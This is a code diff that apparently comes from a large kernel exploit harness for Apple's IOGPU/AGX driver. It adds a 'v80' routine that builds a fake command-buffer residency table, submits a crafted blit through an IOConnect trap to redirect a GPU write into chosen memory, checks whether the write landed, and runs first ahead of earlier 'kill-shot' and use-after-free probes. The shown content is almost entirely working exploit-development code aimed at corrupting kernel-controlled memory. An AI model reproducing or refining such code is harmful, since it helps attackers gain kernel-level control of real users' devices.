@@ -12980,6 +12980,88 @@ static void p_killshot_only(void) {
     LOG("[v79] done (alive)");
 }
 
+
+// V80: proper GPUVA resource (Metal flags) + blit redirect to it. Read back.
+static void p_gpuwrite(void) {
+    LOG("[v80] GPUVA-correct blit redirect");
+    io_connect_t c = open_service("IOGPU", 1);
+    if (!c) return;
+    uint8_t *in = must_map(0x2000);
+    uint8_t *out = must_map(0x1000);
+    uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0;
+    uint64_t a14[2] = { 0x100, 0x10 };
+    size_t osz = 0x10;
+    kern_return_t kr = IOConnectCallMethod(c, 14, a14, 2, NULL, 0, osc, &nosc, out, &osz);
+    uint64_t nqid = *(uint64_t *)(out + 8);
+    memset(in, 0, 0x2000); memset(out, 0, 0x1000);
+    osz = 0x10; nosc = 0;
+    kr = IOConnectCallMethod(c, 6, NULL, 0, in, 0x410, osc, &nosc, out, &osz);
+    uint64_t qid = *(uint64_t *)out;
+    uint64_t a24[2] = { qid, nqid };
+    if (IOConnectCallScalarMethod(c, 24, a24, 2, NULL, NULL)) { LOG("[gw] bind fail"); return; }
+
+    // resource with Metal shared-buffer flags
+    uint8_t *tgt = must_map(0x10000);
+    memset(tgt, 0x41, 0x10000);
+    uint8_t *i2 = must_map(0x1000);
+    uint8_t *o2 = must_map(0x1000);
+    memset(i2, 0, 0x1000); memset(o2, 0, 0x1000);
+    *(uint32_t *)(i2 + 0x00) = 0x80;
+    *(uint32_t *)(i2 + 0x08) = 0x10001;
+    *(uint16_t *)(i2 + 0x0c) = 1;
+    *(uint32_t *)(i2 + 0x14) = 0x1000450;    // Metal shared-buffer map flags
+    *(uint32_t *)(i2 + 0x30) = 1;
+    *(uint64_t *)(i2 + 0x38) = (uint64_t)(uintptr_t)tgt;          // CPU backing
+    *(uint64_t *)(i2 + 0x40) = (uint64_t)(uintptr_t)tgt;
+    *(uint64_t *)(i2 + 0x48) = 0x10000;
+    size_t os2 = 0x58; uint32_t n2 = 0;
+    kern_return_t k9 = IOConnectCallMethod(c, 8, NULL, 0, i2, 0x68, osc, &nosc, o2, &os2);
+    uint64_t gpuva = *(uint64_t *)(o2 + 0x00);
+    uint32_t rid = *(uint32_t *)(o2 + 0x24);
+    LOG("[gw] flagged resource: kr 0x%08x rid %u GPUVA 0x%llx (cpuptr %llx)",
+        k9, rid, gpuva, *(uint64_t *)(o2 + 0x08));
+
+    uint8_t *vaA, *vaB;
+    uint32_t idA = gpu_shmem(c, 0x4000, &vaA);
+    uint32_t idB = gpu_shmem(c, 0x4000, &vaB);
+    if (!idA || !idB) return;
+    uint8_t *entry = must_map(0x1000);
+    // fake command-buffer-storage with residency table:
+    // aux1 = storage (table ptr @+0x300, count @+0x318), aux2 = resource table
+    uint8_t *aux1 = must_map(0x1000);
+    uint8_t *aux2 = must_map(0x1000);
+    memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
+    *(uint64_t *)(aux1 + 0x300) = (uint64_t)(uintptr_t)aux2;   // resource table ptr
+    *(uint32_t *)(aux1 + 0x318) = 4;                           // table capacity
+    // residency entry 0 (0x40 bytes): our resource
+    *(uint64_t *)(aux2 + 0x00) = gpuva;                        // GPUVA
+    *(uint64_t *)(aux2 + 0x08) = (uint64_t)(uintptr_t)tgt;     // CPU ptr
+    *(uint64_t *)(aux2 + 0x10) = gpuva + 0x10000;              // end
+    *(uint64_t *)(aux2 + 0x18) = (uint64_t)(uintptr_t)tgt;     // CPU ptr
+    *(uint64_t *)(aux2 + 0x38) = rid;                          // resource id
+    uint32_t *outw = (uint32_t *)must_map(0x100);
+
+    // blit with our real GPUVA
+    memcpy(vaA, agx_A4_image, 0x4000);
+    memcpy(vaB, agx_B4_image, 0x4000);
+    *(uint64_t *)(vaA + 0xac + 0x340) = gpuva;
+    *(uint64_t *)(vaA + 0xa28) = gpuva;
+    memset(entry, 0, 0x1000);
+    *(uint32_t *)(entry + 0x00) = idA;
+    *(uint32_t *)(entry + 0x04) = idB;
+    *(uint32_t *)(entry + 0x20) = rid;              // residency
+    *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
+    *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
+    *outw = 0xdeadbeef;
+    kern_return_t kt = ioconnect_trap4(c, 0, qid, 0x40, (uintptr_t)entry, (uintptr_t)outw);
+    LOG("[gw] submit GPUVA 0x%llx -> kr 0x%08x outw %08x", gpuva, kt, *outw);
+    usleep(500000);
+    long c5 = 0;
+    for (int i = 0; i < 0x10000; i++) if (tgt[i] == 0x5A) c5++;
+    LOG("[gw] *** target 0x5A bytes: %ld / 0x10000 %s", c5, c5 ? "WRITE OBSERVED!" : "(no write)");
+    LOG("[v80] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -13110,6 +13192,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        p_gpuwrite();       // v80: GPUVA-correct blit redirect FIRST
         p_killshot_only();  // v79: isolated kill-shot loop FIRST
         p_blithit();        // v76: blit + prepared resource sweep
         p_gpuva2();         // v74: sel45 GPU mapping
